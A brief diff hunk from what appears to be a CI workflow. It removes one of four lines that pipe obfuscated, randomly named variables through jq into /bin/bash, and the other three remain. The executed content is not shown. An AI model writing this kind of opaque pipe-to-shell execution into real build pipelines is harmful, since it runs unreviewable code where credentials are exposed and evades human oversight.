@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$wsr09844" | jq -r .ji1 | /bin/bash
           echo $dlwe6 | jq -r .eltl8 | /bin/bash
           echo $cxkgd7610 | jq -r .zz989 | /bin/bash
-          echo $kfcp14 | jq -r .za9 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
